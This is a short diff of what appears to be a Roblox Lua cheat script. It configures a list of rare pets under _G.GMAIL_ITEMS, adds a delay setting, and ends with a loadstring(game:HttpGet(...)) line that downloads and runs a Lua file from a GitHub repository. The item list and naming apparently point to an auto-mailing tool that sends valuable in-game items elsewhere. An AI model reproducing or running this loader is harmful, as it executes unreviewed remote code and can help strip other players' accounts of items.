@@ -27,4 +27,5 @@ _G.GMAIL_ITEMS = {
   ["Shiny Golden Fireball Cat"] = {Class = "Pet", Id = "Fireball Cat", MinAmount = 1, IsGold = true, IsShiny = true},
   ["Shiny RB Fireball Cat"] = {Class = "Pet", Id = "Fireball Cat", MinAmount = 1, IsRainbow = true, IsShiny = true},
 }
+_G.GMAIL_DELAY = 7.1
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sxdasfvas/test/main/gscripts.lua"))()
